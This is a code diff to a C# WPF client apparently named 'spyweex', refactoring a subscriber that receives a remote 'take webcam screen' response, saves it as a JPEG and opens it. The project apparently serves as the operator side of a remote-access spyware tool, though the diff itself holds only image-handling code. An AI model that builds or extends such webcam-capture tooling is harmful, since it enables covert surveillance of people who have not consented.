@@ -17,46 +17,41 @@ namespace spyweex_client_wpf.Subscribers
             isSubscribed = true;
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
-                ObserveOn(TaskPoolScheduler.Default).
+                ObserveOn(Scheduler.Immediate).
                 SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN)).
                 Subscribe(
                 response =>
                 {
                     Response resp = (Response)response;
-                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN))
+
+                    using (MemoryStream byteStream = new MemoryStream(resp.content))
                     {
-                        using (MemoryStream byteStream = new MemoryStream(resp.content))
-                        {
-                            BitmapImage bi = new BitmapImage();
-                            bi.BeginInit();
-                            bi.CacheOption = BitmapCacheOption.OnLoad;
-                            bi.StreamSource = byteStream;
-                            bi.EndInit();
+                        BitmapImage bi = new BitmapImage();
+                        bi.BeginInit();
+                        bi.CacheOption = BitmapCacheOption.OnLoad;
+                        bi.StreamSource = byteStream;
+                        bi.EndInit();
 
-                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
-                            Guid photoID = System.Guid.NewGuid();
-                            String photolocation = photoID.ToString() + ".jpg";  //file name 
+                        JpegBitmapEncoder encoder = new JpegBitmapEncoder();
+                        Guid photoID = System.Guid.NewGuid();
+                        String photolocation = photoID.ToString() + ".jpg";  //file name 
 
-                            encoder.Frames.Add(BitmapFrame.Create(bi));
+                        encoder.Frames.Add(BitmapFrame.Create(bi));
 
-                            using (var filestream = new FileStream(photolocation, FileMode.Create))
-                                encoder.Save(filestream);
+                        using (var filestream = new FileStream(photolocation, FileMode.Create))
+                            encoder.Save(filestream);
 
-                            byteStream.Close();
-                            Process.Start(photolocation);
-
-                        }
-                        Debug.WriteLine("Task Completed");
+                        byteStream.Close();
+                        Process.Start(photolocation);
                         UnsubscribeAsync();
                     }
+                    Debug.WriteLine("Task webcampic Completed");
                 },
                 err =>
                 {
                     Debug.WriteLine((Exception)err);
                     MessageBoxResult result = MessageBox.Show("Error occured in Webcam screen subscriber " + (Exception)err);
-                    UnsubscribeAsync();
                 }
-
                 );
             subscriberToken = idisp;
         }
